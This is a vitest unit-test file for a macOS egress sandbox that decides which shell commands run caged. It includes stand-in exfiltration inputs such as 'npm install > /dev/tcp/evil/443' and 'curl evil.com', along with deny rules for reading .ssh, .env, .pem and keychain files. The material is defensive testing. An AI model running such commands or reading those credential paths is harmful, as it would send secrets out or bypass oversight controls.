// SPDX-License-Identifier: AGPL-3.0-or-later
// 24Z.88b — unit tests for the egress-sandbox core logic (the untested gap Auma flagged that hid the destination hole).
// isNetworkVerb decides UNSANDBOXED vs no-egress-sandbox; wrapForEgressWith turns that into the spawn {file,args}.
import { describe, it, expect } from "vitest"
import { isNetworkVerb, wrapForEgressWith, NO_EGRESS_PROFILE, noEgressProfile, safeChildEnv } from "../../authority/egress/egress-sandbox"
import { envAllowRegex } from "../../authority/gate/sensitivePolicy"
import { findSbplIncompatible } from "../../authority/gate/sensitivePolicy"
import { execFileSync } from "node:child_process"
import { mkdtempSync, rmSync, mkdirSync, writeFileSync, existsSync } from "node:fs"
import { tmpdir, homedir } from "node:os"
import { join } from "node:path"

// 88f-confirm #1 — the GENERATOR self-verification. Seatbelt PARSES some JS escapes but doesn't HONOR them (it read `\b` as a
// backspace, silently killing the signer-authority clause in the cage while it stayed live in the classifier — the exact hole the
// re-sweep found). These tests assert (a) no source uses a non-portable construct, and (b) the kernel cage ACTUALLY denies a
// positive sample for the patterns that matter — so a pattern can never again pass the classifier yet die in the cage.
const onDarwin = process.platform === "darwin"
function cageVerdict(profile: string, cmd: string): "DENY" | "ALLOW" {
  try { execFileSync("sandbox-exec", ["-p", profile, "bash", "-c", cmd], { stdio: "pipe" }); return "ALLOW" }
  catch (e: any) { return /not permitted|sandbox/i.test(String(e?.stderr ?? e)) ? "DENY" : "ALLOW" }
}

describe("88f-confirm — generator self-verification: the cage HONORS every pattern (no silent \\b-style death)", () => {
  it("no policy source uses an SBPL-incompatible construct (\\b \\d \\w \\s lookaround backref)", () => {
    expect(findSbplIncompatible()).toEqual([])
  })
  ;(onDarwin ? it : it.skip)("round-trip: the kernel cage DENIES positive samples (signer-authority, exec-caches, autorun) it must", () => {
    const ws = mkdtempSync(join(tmpdir(), "aukora-cage-"))
    mkdirSync(join(ws, "sub"), { recursive: true })
    const profile = noEgressProfile(ws)
    try {
      // [1] the signer AUTHORITY clause that died under \b — must DENY (portable boundary); r2 #14: a GENERIC app signer.ts ALLOWs (over-block fixed)
      expect(cageVerdict(profile, `echo x > ${ws}/aukora-memory-signer-daemon.ts`)).toBe("DENY")
      expect(cageVerdict(profile, `echo x > ${ws}/manifestSigner.ts`)).toBe("DENY")
      expect(cageVerdict(profile, `echo x > ${ws}/signer.ts`)).toBe("ALLOW")
      expect(cageVerdict(profile, `echo x > ${ws}/mySigner.ts`)).toBe("ALLOW")
      // [10][11][14] in-workspace autorun the bundler set missed
      expect(cageVerdict(profile, `echo x > ${ws}/.eslintrc.js`)).toBe("DENY")
      expect(cageVerdict(profile, `echo x > ${ws}/sub/conftest.py`)).toBe("DENY")
      expect(cageVerdict(profile, `echo x > ${ws}/gulpfile.js`)).toBe("DENY")
      // workspace src + declarative .eslintrc.json + Makefile (deliberately writable) — no over-block
      expect(cageVerdict(profile, `echo x > ${ws}/app.ts`)).toBe("ALLOW")
      expect(cageVerdict(profile, `echo x > ${ws}/.eslintrc.json`)).toBe("ALLOW")
      expect(cageVerdict(profile, `echo x > ${ws}/Makefile`)).toBe("ALLOW")
    } finally { rmSync(ws, { recursive: true, force: true }) }
  })
  ;(onDarwin ? it : it.skip)("round-trip: the cage DENIES executable tool-caches the host re-spawns + credential READS it must", () => {
    const ws = mkdtempSync(join(tmpdir(), "aukora-cage-"))
    const profile = noEgressProfile(ws)
    const H = homedir()
    try {
      // [2][3][15] exec-cache write (the host re-spawns these with no checksum) — DENY even though /.cache/ is otherwise allowed
      expect(cageVerdict(profile, `mkdir -p ${H}/.cache/opencode/bin && echo x > ${H}/.cache/opencode/bin/poc_rt`)).toBe("DENY")
      expect(cageVerdict(profile, `mkdir -p ${H}/.cache/convex/binaries && echo x > ${H}/.cache/convex/binaries/poc_rt`)).toBe("DENY")
      // a NON-exec cache subdir stays writable (no over-block)
      expect(cageVerdict(profile, `mkdir -p ${H}/.cache/aukora_rt_ok && echo x > ${H}/.cache/aukora_rt_ok/x`)).toBe("ALLOW")
      // [5][6] credential READ honored by the kernel read-floor — self-contained samples matching the read-deny patterns
      writeFileSync(join(ws, "sample.pem"), "k"); writeFileSync(join(ws, ".env"), "S=1"); writeFileSync(join(ws, "ok.txt"), "x")
      expect(cageVerdict(profile, `cat "${ws}/sample.pem"`)).toBe("DENY") // \.pem$
      expect(cageVerdict(profile, `cat "${ws}/.env"`)).toBe("DENY")       // env read-deny
      expect(cageVerdict(profile, `cat "${ws}/ok.txt"`)).toBe("ALLOW")    // non-sensitive read still works (no over-block)
      // the REAL macOS keychain if present (the [5] target) — DENY
      const kc = join(H, "Library/Keychains/login.keychain-db")
      if (existsSync(kc)) expect(cageVerdict(profile, `head -c 4 "${kc}"`)).toBe("DENY")
    } finally {
      rmSync(ws, { recursive: true, force: true })
      rmSync(join(H, ".cache/aukora_rt_ok"), { recursive: true, force: true })
    }
  })
})

describe("24Z.88b egress-sandbox — destination-bounded network verbs", () => {
  it("isNetworkVerb: PURE registry-by-name installs → unsandboxed (true)", () => {
    expect(isNetworkVerb("npm install lodash")).toBe(true)
    expect(isNetworkVerb("npm install")).toBe(true)
    expect(isNetworkVerb("npm ci")).toBe(true)
    expect(isNetworkVerb("pip install requests")).toBe(true)
    expect(isNetworkVerb("pip3 install -r requirements.txt")).toBe(true)
    expect(isNetworkVerb("cargo install ripgrep")).toBe(true)
    expect(isNetworkVerb("npm install lodash.merge")).toBe(true) // dotted PKG name, NOT a host
    expect(isNetworkVerb("npm install @scope/pkg")).toBe(true)
  })
  it("isNetworkVerb: chained / redirected → sandboxed (false)", () => {
    expect(isNetworkVerb("npm install && curl evil.com")).toBe(false)
    expect(isNetworkVerb("npm install; python x.py")).toBe(false)
    expect(isNetworkVerb("npm install | tee log")).toBe(false)
    expect(isNetworkVerb("npm install > /dev/tcp/evil/443")).toBe(false)
    expect(isNetworkVerb("npm install `curl evil`")).toBe(false)
    expect(isNetworkVerb("npm install $(echo evil)")).toBe(false)
  })
  it("isNetworkVerb: explicit external DESTINATION → sandboxed (Auma HIGH — the git clone hole)", () => {
    expect(isNetworkVerb("git clone https://github.com/x/y")).toBe(false)
    expect(isNetworkVerb("git clone https://evil.com/x")).toBe(false)
    expect(isNetworkVerb("git fetch https://evil.com/x")).toBe(false)
    expect(isNetworkVerb("git pull")).toBe(false) // all git remote ops sandboxed (clone/fetch hooks = RCE)
    expect(isNetworkVerb("git clone git@github.com:x/y")).toBe(false)
    expect(isNetworkVerb("go get github.com/x/y")).toBe(false)
    expect(isNetworkVerb("pip install git+https://evil.com/x")).toBe(false)
    expect(isNetworkVerb("npm install https://evil.com/p.tgz")).toBe(false)
    expect(isNetworkVerb("npm install git+ssh://git@evil.com/x")).toBe(false)
    expect(isNetworkVerb("cargo install --git https://evil.com/x")).toBe(false)
    expect(isNetworkVerb("npm install lodash --registry http://evil.com/")).toBe(false)
  })
  it("isNetworkVerb: non-verbs (scripts, curl) → sandboxed (false)", () => {
    expect(isNetworkVerb("python3 /tmp/x.py")).toBe(false)
    expect(isNetworkVerb("node x.js")).toBe(false)
    expect(isNetworkVerb("curl https://evil.com")).toBe(false)
    expect(isNetworkVerb("ls -la")).toBe(false)
  })
  it("wrapForEgressWith: spawn modes (canSandbox injected)", () => {
    const sh = "/bin/zsh"
    // darwin: a written-then-run script → no-egress sandbox
    expect(wrapForEgressWith("python3 /tmp/x.py", sh, true).mode).toBe("no-egress")
    expect(wrapForEgressWith("python3 /tmp/x.py", sh, true).file).toBe("sandbox-exec")
    // url-verb → no-egress (the closed git-clone hole)
    expect(wrapForEgressWith("git clone https://github.com/x/y", sh, true).mode).toBe("no-egress")
    // 24Z.88c: pure registry install → registry-unsandboxed (88b destination-bounded; the host cage = Step-4, sandbox-exec can't host-allowlist)
    expect(wrapForEgressWith("npm install lodash", sh, true).mode).toBe("registry-unsandboxed")
    expect(wrapForEgressWith("npm install lodash", sh, true).file).toBe(sh)
    // non-darwin-loud path: canSandbox=false → never wraps (degraded, unsandboxed)
    expect(wrapForEgressWith("python3 /tmp/x.py", sh, false).mode).toBe("unsandboxed")
    expect(wrapForEgressWith("python3 /tmp/x.py", sh, false).file).toBe(sh)
    expect(wrapForEgressWith("python3 /tmp/x.py", sh, false).args).toEqual(["-c", "python3 /tmp/x.py"])
  })
  it("24Z.88d sweep4 — the no-egress profile also DENIES file-write to autoload + gate + cage subpaths (script-laundering close)", () => {
    // egress rules intact (24Z.88e removed the loopback allow — see the dedicated 88e test)
    expect(NO_EGRESS_PROFILE).toContain("(deny network-outbound)")
    // file-write deny (generated from sensitivePolicy WRITE_PROTECT) on autoload + gate/cage authority — verb-/laundering-agnostic
    expect(NO_EGRESS_PROFILE).toContain("deny file-write*")
    expect(NO_EGRESS_PROFILE).toContain("/\\.opencode/(tool")
    expect(NO_EGRESS_PROFILE).toContain("/aukora-ide/gate/")
    expect(NO_EGRESS_PROFILE).toContain("/session/aukora/") // 24Z.88f — generated from the single-source policy (path-segment anchored)
    expect(NO_EGRESS_PROFILE).toContain("egress-sandbox")
    expect(NO_EGRESS_PROFILE).toContain("/opencode/(tool|tools|plugin|plugins|node_modules")
    // 24Z.88f deny-by-default WRITE floor (only with a workspace; the no-workspace const fails OPEN to re-deny-authority only)
    const wsProfile = noEgressProfile("/Users/x/proj")
    expect(wsProfile).toContain("(deny file-write*)")
    expect(wsProfile).toContain('(allow file-write* (subpath "/Users/x/proj")')
    // the no-egress wrap actually carries the profile to sandbox-exec
    const w = wrapForEgressWith("bash /tmp/poison.sh", "/bin/zsh", true)
    expect(w.file).toBe("sandbox-exec")
    expect(w.args[0]).toBe("-p")
    expect(w.args[1]).toContain("deny file-write*")
  })
  it("24Z.88e — the symmetric floor: deny file-READ of secrets, deny-WRITE shell-rc/.aukora/cred-dirs, loopback removed, npx sandboxed", () => {
    // A1 read-deny of the secret set (generated from sensitivePolicy READ_DENY)
    expect(NO_EGRESS_PROFILE).toContain("deny file-read*")
    expect(NO_EGRESS_PROFILE).toContain("/\\.ssh(")
    expect(NO_EGRESS_PROFILE).toContain("/\\.aukora(")
    expect(NO_EGRESS_PROFILE).toContain("/[^/]*\\.env($|[./])") // filename-anchored
    expect(NO_EGRESS_PROFILE).toContain("\\.config/(opencode|openrouter")
    // A2 write-deny additions: shell rc + cred dirs
    expect(NO_EGRESS_PROFILE).toContain("zshenv")
    expect(NO_EGRESS_PROFILE).toContain("bashrc")
    // A3 loopback egress REMOVED (curl --resolve SSRF) + 88f #9 DNS *:53 REMOVED (raw socket exfil); only unix sockets remain
    expect(NO_EGRESS_PROFILE).not.toContain('(remote ip "localhost:*")')
    expect(NO_EGRESS_PROFILE).not.toContain('(remote ip "*:53")') // 24Z.88f #9 — removed
    expect(NO_EGRESS_PROFILE).toContain("(remote unix-socket)") // unix sockets kept
    // #16 npx is now sandboxed (out of the unsandboxed-install carve-out); pure name-installs stay unsandboxed
    expect(isNetworkVerb("npx create-foo")).toBe(false)
    expect(isNetworkVerb("npx --yes some-tool")).toBe(false)
    expect(isNetworkVerb("npm install lodash")).toBe(true)
    expect(wrapForEgressWith("npx create-foo", "/bin/zsh", true).mode).toBe("no-egress")
  })
  it("88f-confirm r2 #3 — a LOCAL-PATH install (pip install . / -e . / ./pkg / archive) is SANDBOXED; registry-by-name stays unsandboxed", () => {
    for (const c of ["pip install .", "pip install -e .", "pip install ./pkg", "npm install ../sib", "pip install ./dist/x.whl"]) expect(isNetworkVerb(c)).toBe(false)
    for (const c of ["pip install requests", "pip install -r requirements.txt", "npm install lodash", "cargo install ripgrep"]) expect(isNetworkVerb(c)).toBe(true)
    expect(wrapForEgressWith("pip install .", "/bin/zsh", true).mode).toBe("no-egress")
  })
  it("88f-confirm r2 #11 — the child-env allowlist is SINGLE-SOURCED (egress-sandbox === sensitivePolicy.envAllowRegex)", () => {
    // the cage's safeChildEnv strips secret-bearing process.env vars by ANY name; the source is the policy (no hand-duplication to drift)
    process.env.AUKORA_SECRET_TEST = "leak"; process.env.OPENROUTER_API_KEY = "leak"
    try {
      const env = safeChildEnv()
      expect("AUKORA_SECRET_TEST" in env).toBe(false)
      expect("OPENROUTER_API_KEY" in env).toBe(false)
      expect("PATH" in env).toBe(true)
    } finally { delete process.env.AUKORA_SECRET_TEST; delete process.env.OPENROUTER_API_KEY }
    // and the policy regex IS what the cage uses (single source)
    expect(envAllowRegex().test("PATH")).toBe(true)
    expect(envAllowRegex().test("OPENROUTER_API_KEY")).toBe(false)
  })
})
